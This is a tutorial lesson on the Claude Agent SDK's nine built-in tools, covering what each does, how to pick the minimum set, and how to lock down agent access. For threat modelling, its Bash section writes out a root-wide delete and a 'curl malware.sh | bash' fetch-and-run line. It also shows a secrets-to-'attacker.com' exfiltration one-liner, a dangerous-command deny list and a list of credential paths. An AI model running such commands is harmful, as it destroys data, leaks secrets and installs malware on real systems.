---
sidebar_position: 3
title: "Built-in Tools Deep Dive"
chapter: 36
lesson: 3
duration_minutes: 30
description: "Master the 9 built-in tools in the Claude Agent SDK—what each does, when to use it, and how to secure agent access."
keywords: ["Claude Agent SDK", "Built-in Tools", "Read", "Write", "Edit", "Bash", "Glob", "Grep", "WebSearch", "WebFetch", "Task", "Tool Selection", "Agent Security"]

# HIDDEN SKILLS METADATA
skills:
  - name: "Tool Selection for Agent Tasks"
    proficiency_level: "B1"
    category: "Technical"
    bloom_level: "Apply"
    digcomp_area: "Problem-Solving"
    measurable_at_this_level: "Student can select appropriate tools for a given task (e.g., 'Read + Grep for code search', 'Bash for system operations') and justify security implications"

  - name: "Access Control Configuration (allowed_tools, disallowed_tools)"
    proficiency_level: "B2"
    category: "Technical"
    bloom_level: "Apply"
    digcomp_area: "Safety and Security"
    measurable_at_this_level: "Student can configure tool restrictions to balance capability with safety (deny Bash for sandboxed agents, allow specific read-only tools for limited-scope tasks)"

  - name: "Agent Capability Decomposition"
    proficiency_level: "B1"
    category: "Conceptual"
    bloom_level: "Understand"
    digcomp_area: "Technical Communication"
    measurable_at_this_level: "Student can map business requirements to required tools (e.g., 'code review agent needs Read + Grep + Bash for testing')"

learning_objectives:
  - objective: "Identify the purpose and use case for each of the 9 built-in tools"
    proficiency_level: "B1"
    bloom_level: "Remember"
    assessment_method: "Tool selection exercise: given 5 tasks, pick appropriate tools"

  - objective: "Apply tool selection strategy to design agent capabilities"
    proficiency_level: "B1"
    bloom_level: "Apply"
    assessment_method: "Write agent specification with required tools list and justification"

  - objective: "Evaluate security implications of tool access and configure restrictions"
    proficiency_level: "B2"
    bloom_level: "Analyze"
    assessment_method: "Review agent configuration and identify security gaps"

cognitive_load:
  new_concepts: 9
  assessment: "9 tools, each distinct in purpose (Read, Write, Edit, Bash, Glob, Grep, WebSearch, WebFetch, Task). Presented in functional categories to reduce load."

differentiation:
  extension_for_advanced: "Design multi-agent system where agents have different tool permissions (reader agent, editor agent, executor agent). Implement hooks to restrict dangerous Bash commands dynamically."
  remedial_for_struggling: "Focus on core 5 tools first (Read, Write, Edit, Bash, WebSearch). Defer advanced tools (Glob, Grep, Task) until comfortable with basics. Use decision tree: 'Do I need to find files?' → Glob. 'Do I need to search contents?' → Grep."

---

# Built-in Tools Deep Dive

Claude Code's power comes from 9 battle-tested tools. Now they're yours.

When you build agents with the Claude Agent SDK, you don't have to implement file systems, terminal execution, or web APIs yourself. These 9 tools are battle-tested in production—they handle edge cases, manage context, and integrate seamlessly into the agent loop.

But power requires discipline. An agent with full access to all tools is powerful but dangerous. An agent restricted to read-only operations is safe but limited. The key skill is **tool selection**—choosing exactly which tools your agent needs and nothing more.

Think of it like access control on a server. You don't give everyone root access. You grant the minimum permissions necessary for their job.

## The 9 Tools: What Each Does

### File Operations (Read, Write, Edit)

These three tools handle everything to do with files on disk.

#### Read: Access Any File

**What it does**: Reads file contents. Supports text files, images (PNG, JPG, GIF), PDFs, and Jupyter notebooks.

**Input**:
```python
{
  "file_path": "/Users/alice/project/src/auth.py",
  "offset": 1,          # Optional: start from line
  "limit": 100          # Optional: read 100 lines
}
```

**Output**: File contents with line numbers, or error if file doesn't exist.

**When to use**:
- Context gathering: "What does this config file contain?"
- Code analysis: "Find the bug in this function"
- Document review: "Summarize the requirements.md"
- Debugging: "Show me the error logs"

**Security consideration**: Read is the "least dangerous" tool. It only views files, never modifies them. Safe to grant broadly.

---

#### Write: Create New Files

**What it does**: Creates new files from scratch. Fails if file already exists (prevents accidental overwrites).

**Input**:
```python
{
  "file_path": "/Users/alice/project/config.yaml",
  "content": "database:\n  host: localhost\n  port: 5432"
}
```

**Output**: Success confirmation or error (e.g., "File already exists").

**When to use**:
- Scaffolding: Generate new project structure
- Configuration: Create new config files
- Documentation: Generate README files
- Code generation: Create new source files

**Security consideration**: Write creates new files only. It cannot modify existing files. Safe for generation tasks, dangerous if agent should not create arbitrary files in system directories.

---

#### Edit: Modify Existing Files

**What it does**: Makes precise changes to existing files using find-and-replace. Can edit text files, code, or configuration.

**Input**:
```python
{
  "file_path": "/Users/alice/project/app.py",
  "old_string": "debug = False",
  "new_string": "debug = True",
  "replace_all": False  # If True, replace ALL occurrences
}
```

**Output**: Confirmation that edit succeeded, or error (e.g., "String not found").

**When to use**:
- Bug fixes: "Change this line to fix the error"
- Configuration updates: "Update the database connection string"
- Refactoring: "Rename this variable throughout the file"
- Feature toggles: "Enable experimental features"

**Security consideration**: Edit is powerful—it can change code behavior. Restrict to agents you trust. Use hooks to prevent dangerous edits (e.g., block edits to security-critical files).

---

### System Operations (Bash)

#### Bash: Run Terminal Commands

**What it does**: Executes shell commands. Can run scripts, git operations, build tools, package managers, and system utilities.

**Input**:
```python
{
  "command": "npm run build"
}
```

**Output**: Command output (stdout + stderr), exit code.

**When to use**:
- Build automation: `npm run build`, `python -m pytest`
- Version control: `git status`, `git commit -m "message"`
- File operations: `ls`, `cp`, `rm`, `find` (though Glob is better for search)
- System checks: `node --version`, `python -c "import sys; print(sys.version)"`
- Package management: `pip install`, `npm install`

**Security consideration**: Bash is the most dangerous tool. It can:
- Delete files recursively: `rm -rf /`
- Access system config: `/etc/passwd`
- Exfiltrate data: `cat secrets.txt | curl attacker.com`
- Install malware: `curl malware.sh | bash`

**Restriction strategy**:
- For untrusted inputs, deny Bash entirely
- For trusted agents, use hooks to block dangerous patterns: `rm -rf`, `sudo`, file read from `/etc/`
- Default to deny, then explicitly allow specific commands

---

### File Discovery (Glob)

#### Glob: Find Files by Pattern

**What it does**: Searches filesystem using glob patterns. Returns matching file paths.

**Input**:
```python
{
  "pattern": "**/*.py"     # Python files, any depth
}
```

**Common patterns**:
- `*.js` → All JavaScript in current directory
- `**/*.ts` → All TypeScript, any depth
- `src/**/*.test.ts` → Test files in src/
- `docs/[0-9]*/*.md` → Numbered chapters

**Output**: Array of matching file paths, sorted by modification time.

**When to use**:
- Code inventory: "Find all test files"
- Dependency discovery: "List all package.json files"
- Cleanup: "Find files larger than 100MB"
- Analysis: "Which Python files import this module?"

**Security consideration**: Glob is read-only—it only lists filenames, doesn't read contents. Safe to allow.

---

### Code Search (Grep)

#### Grep: Search File Contents

**What it does**: Searches file contents using regex patterns. Returns matching lines with context.

**Input**:
```python
{
  "pattern": "def authenticate",         # Regex pattern
  "glob": "**/*.py",                      # Filter to Python files
  "output_mode": "content",               # Show matching lines
  "-B": 2,                                # 2 lines before match
  "-A": 3                                 # 3 lines after match
}
```

**Common use cases**:
- Security audit: `grep -i "password.*hardcoded"` → Find hardcoded credentials
- API discovery: `grep "def /api/"` → Find all API routes
- Error analysis: `grep "ERROR\|WARN"` → Find error logs
- Codebase analysis: `grep "import Database"` → Find database usages

**Output**: Matching lines with line numbers, optionally with context.

**When to use**:
- Pattern matching: "Find all TODO comments in the codebase"
- Security scanning: "Find hardcoded API keys"
- Refactoring: "Where is this function called?"
- Log analysis: "Show all error lines from this file"

**Security consideration**: Grep is read-only—it searches but cannot modify. Safe to allow.

---

### Web Operations (WebSearch, WebFetch)

#### WebSearch: Search the Web

**What it does**: Searches the internet using a search engine. Returns links and summaries.

**Input**:
```python
{
  "query": "Node.js async patterns 2025",
  "allowed_domains": ["nodejs.org", "github.com"],  # Optional: filter results
  "blocked_domains": ["medium.com"]                  # Optional: exclude sources
}
```

**Output**: Search results (title, URL, snippet).

**When to use**:
- Research: "Find the latest Node.js documentation"
- Troubleshooting: "How do I fix this error message?"
- Trend analysis: "What's the current adoption rate for this tool?"
- Fact-checking: "Is this API still supported?"

**Security consideration**: WebSearch makes external requests. Restricted to read-only operations on external sites. However, agents could search for malicious content or exfiltrate information through search queries (e.g., "password123 site:attacker.com").

**Restriction strategy**:
- Allow for research agents building context
- Block for agents processing sensitive data (don't let them search with customer names, API keys, etc.)

---

#### WebFetch: Fetch and Parse Web Pages

**What it does**: Downloads a web page and extracts content as markdown. Handles HTML parsing, JavaScript-heavy sites, PDFs.

**Input**:
```python
{
  "url": "https://docs.anthropic.com/agents",
  "prompt": "What are the key limitations of the Task tool?"
}
```

**Output**: Page content as markdown, or AI-generated answer based on prompt.

**When to use**:
- Documentation: "Fetch the full API docs"
- Content extraction: "Get the README from this GitHub repo"
- Information gathering: "Summarize this blog post"
- Validation: "Does this URL still work?"

**Security consideration**: WebFetch makes external requests. Could be used to:
- Exfiltrate data: Fetch attacker-controlled page that logs what you requested
- Slow down agent: Fetch slow-responding servers
- Access internal systems: Fetch from private IP addresses (if sandbox doesn't prevent)

**Restriction strategy**:
- Sandbox blocks internal IP access (127.0.0.1, 10.*, 192.168.*)
- Use `blocked_domains` to prevent fetching from suspicious sites
- Agents processing sensitive data should not use WebFetch

---

### Agent Orchestration (Task)

#### Task: Spawn Subagents

**What it does**: Launches parallel subagents to work on separate tasks. Each subagent has its own context, tools, and lifecycle.

**Input**:
```python
{
  "prompt": "Find all security vulnerabilities in src/auth.py",
  "tools": ["Read", "Grep", "Bash"],  # Subagent tool access
  "cwd": "/Users/alice/project"        # Working directory
}
```

**Output**: Subagent results (code review findings, test results, etc.).

**When to use**:
- Parallel analysis: "Scan 5 files for vulnerabilities simultaneously"
- Divide and conquer: "Component A review + Component B review in parallel"
- Specialized subagents: "Security subagent, performance subagent, style subagent all check the code"
- Long-running operations: "Run tests while collecting metrics"

**Scenario**: Code review for a 50-file pull request. Main agent could:
1. Task 1: Subagent reviews files 1-10 for security
2. Task 2: Subagent reviews files 11-20 for performance
3. Task 3: Subagent reviews files 21-50 for style
4. Main agent aggregates findings

**Security consideration**: Task creates new agent instances with specified tool access. Each subagent respects its tool restrictions independently.

**Restriction strategy**:
- Subagents inherit permissions from parent (can't grant more tools than parent has)
- Use Task to reduce tool access: main agent has Read+Write+Bash, but spawn read-only subagent with only Read
- Task is safe—it just creates managed agent processes

---

## Tool Selection Strategy

You now know what each tool does. The skill is **selecting the minimum necessary subset**.

### Decision Framework

For any agent task, ask three questions:

**1. What operation is required?**

| Operation | Tools | Read-Only? |
|-----------|-------|-----------|
| View file | Read | ✓ |
| Create file | Write | ✗ |
| Change file | Edit | ✗ |
| Find files | Glob | ✓ |
| Search contents | Grep | ✓ |
| Run commands | Bash | ✗ |
| Search web | WebSearch | ✓ |
| Fetch pages | WebFetch | ✓ |
| Parallel work | Task | ✗ |

**2. What access level is safe?**

- **Read-only agents**: Read, Glob, Grep, WebSearch, WebFetch only
- **Modification agents**: Add Write, Edit when safe
- **System agents**: Add Bash only if unavoidable, with restrictions
- **Orchestration**: Use Task to reduce subagent scope

**3. What dangerous patterns should be blocked?**

For Bash (the risky tool):
```python
# Block these patterns
dangerous_patterns = [
  "rm -rf",           # Recursive delete
  "sudo",             # Privilege escalation
  "> /etc/",          # Write to system
  "curl.*|bash",      # Download and execute
  "eval",             # Execute strings
  "chmod 777"         # Change permissions dangerously
]
```

For Edit:
```python
# Block edits to these files
protected_paths = [
  "/etc/",            # System config
  "/.aws/",           # AWS credentials
  "/.ssh/",           # SSH keys
  "/var/log/",        # System logs
]
```

---

## Example Agent Configurations

### Read-Only Code Analyzer

```python
options = ClaudeAgentOptions(
    allowed_tools=["Read", "Glob", "Grep"],
    disallowed_tools=["Write", "Edit", "Bash", "WebSearch"],
)
```

**Capabilities**: Analyze code, find patterns, report issues (cannot modify anything).

**Security**: Safe for untrusted codebases.

---

### Development Agent (Full Capability)

```python
options = ClaudeAgentOptions(
    allowed_tools=["Read", "Write", "Edit", "Bash", "Glob", "Grep"],
    disallowed_tools=["WebSearch"],  # Explicit block
    hooks={
        "PreToolUse": [
            block_dangerous_bash,  # Custom hook
            block_protected_edits
        ]
    }
)
```

**Capabilities**: Full code development (read, write, edit, run tests).

**Security**: Protected by hooks that block dangerous patterns.

---

### Research Agent

```python
options = ClaudeAgentOptions(
    allowed_tools=["WebSearch", "WebFetch"],
    disallowed_tools=["Read", "Write", "Edit", "Bash", "Glob", "Grep"],
)
```

**Capabilities**: Research topics online, gather information (no local file access).

**Security**: Cannot access your files, only public web.

---

### Parallel Code Review

```python
options = ClaudeAgentOptions(
    allowed_tools=["Read", "Glob", "Grep", "Task"],
    agents={
        "security-reviewer": AgentDefinition(
            tools=["Read", "Grep"],
            description="Find security issues"
        ),
        "performance-reviewer": AgentDefinition(
            tools=["Read", "Bash"],  # Can run perf tests
            description="Analyze performance"
        ),
        "style-reviewer": AgentDefinition(
            tools=["Read", "Glob"],
            description="Check code style"
        )
    }
)
```

**Capabilities**: Three subagents work in parallel, each with minimal necessary tools.

**Security**: Each subagent is restricted—security-reviewer can't run Bash, performance-reviewer doesn't need Glob.

---

## Try With AI

Use your AI companion to practice tool selection.

### Prompt 1: Tool Selection Decision

```
I'm building an agent to automatically migrate a JavaScript project
from CommonJS to ES modules. The agent needs to:
1. Find all .js files
2. Identify CommonJS patterns (require, module.exports)
3. Convert to ES module syntax
4. Run the test suite to validate changes

What tools should this agent have access to? Justify each tool.
Then, identify any dangerous operations and how you'd restrict them.
```

**What you're learning**: Breaking down requirements into tool requirements, and thinking about safety implications. This is the core skill of agent design.

### Prompt 2: Security Breach Scenario

```
I gave my code-generation agent these tools:
  allowed_tools=["Read", "Write", "Edit", "Bash"]

An engineer on the team runs:
"Generate a script that fetches the latest deployment config
and runs it in production"

What could go wrong? What tool restrictions would prevent this?
What hooks would you need to add?
```

**What you're learning**: Threat modeling—anticipating how agents could be misused, and designing restrictions to prevent harm.

### Prompt 3: Build Your First Configuration

```
Describe an agent you'd like to build (code reviewer, documentation
generator, API client builder, etc.). For this agent:

1. List all required tools
2. List all tools you should BLOCK (why?)
3. Identify dangerous Bash patterns you'd need to restrict
4. Suggest a hook or permission callback that would make this agent safe

Show me the ClaudeAgentOptions configuration for your agent.
```

**What you're learning**: Translating requirements into actual agent configurations. This is agent design in practice.

**Safety Note**: The tools are powerful. Always configure with the "deny by default" principle—grant only the specific tools your agent truly needs, never full access.

